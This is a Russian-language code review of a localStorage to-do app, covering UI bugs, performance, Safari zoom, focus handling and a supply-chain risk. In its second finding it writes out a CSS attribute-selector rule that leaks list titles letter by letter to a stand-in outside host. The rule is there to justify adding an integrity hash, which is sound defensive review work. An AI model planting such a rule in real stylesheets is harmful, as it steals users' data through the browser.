# Задача 1 — ревью кода (review 1)

Один файл `index.html`, 1384 строки. Туду на `localStorage`, иконки с внешнего CDN. Проверено: весь код, линтеры (чисто), Chrome — клики и замеры, axe (0 ошибок). Нагрузка: один человек, тысячи пунктов в окне.

## Существенные

**1. Escape затирает текст вместо отмены — `1220-1246`**
«Отмена» превращается в пустую строку (1224), а для сохранённого списка или пункта эта пустота записывается в память (1240-1246). Название пропадает, отменять нечем. Входа в правку готовой сущности пока нет — это задача 3, там дефект и сработает.
Фикс перед 1240: `if (discard) { render(); return; }`. Для новых сущностей путь закрыт выше, поведение не изменится.

**2. Стили иконок не сверены по хешу — `14-19`, `995`, `1003`**
Полный текст названий лежит в атрибуте `title` (995, 1003). CSS читает атрибуты: `[title^="П"]{background-image:url(https://чужой/?a=П)}` — браузер сам запрашивает «картинку», и в чужом логе оказывается буква; проходя алфавит, собирают весь текст списков. Хватит подменного `bootstrap-icons.min.css`: пакет в npm, CDN, отравленный кеш.
Фикс, тег 16-18: `integrity="sha384-CK2SzKma4jA5H/MXDUU7i1TqZlCFaD4T01vtyDFvPlD97JQyS+IsSh1nI2EFbpyk" crossorigin="anonymous"`. Проверено: у jsDelivr и unpkg файл одинаков (87 008 байт), `access-control-allow-origin: *` и на `file://`, поэтому фолбэк по `onerror` работает. Хеш покрывает CSS, но не `.woff2`.

## Стоит починить

**3. Клик по чекбоксу перестраивает весь экран — `1055-1075`**
Любая правка данных пересоздаёт все узлы списков. Chrome, 5000 открытых пунктов (20 539 узлов): 84 мс блокирующего JS и 254 мс до кадра. Отметка пункта — самое частое действие.
Галочку ставит браузер, меняются только классы: `is-done` у строки и `is-muted` у заголовка, когда пункты сделаны. Проставить на месте — 2 строки, без перерисовки; diff-движок не нужен. После пагинации (задача 2) перемерить.

**4. Safari приближает экран при фокусе поля — `99`, `254-263`, `444-454`**
Если у поля шрифт меньше 16px, Safari по фокусу зумит и не отъезжает. У `.editor` и `.field select` — 15px от `body`: каждый `+` и каждая настройка приближают экран, строки не видно.
Фикс: 16px в оба правила. Полю ввода (955) добавить `enterkeyhint="done"` (клавиша «Готово» вместо «Перевод строки»), `spellcheck="false"`, `autocomplete="off"`.

**5. После «свернуть все» фокус клавиатуры падает в `<body>` — `1077-1082`**
Кнопка становится `disabled`, браузер снимает с неё фокус. Проверено: Enter на «Collapse all» → `activeElement` = `<body>`, Tab идёт с начала страницы. То же после Escape в редакторе.
Фикс: при `disabled` у активной кнопки вернуть фокус соседней; в `restoreFocus()` — `if (!holder) listsEl.focus()` (`tabindex="-1"` у `main` есть).

**6. Перезагрузка из второго окна стирает набранное — `1370-1374`**
Событие `storage` пересобирает списки: открытый редактор уничтожается и строится из стора, незакоммиченный текст пропадает. Отмечено в `task1-done.md`, срок — задача 2.
Фикс сейчас: `if (ui.editing) return;` — устаревший вид лучше потерянных клавиш.
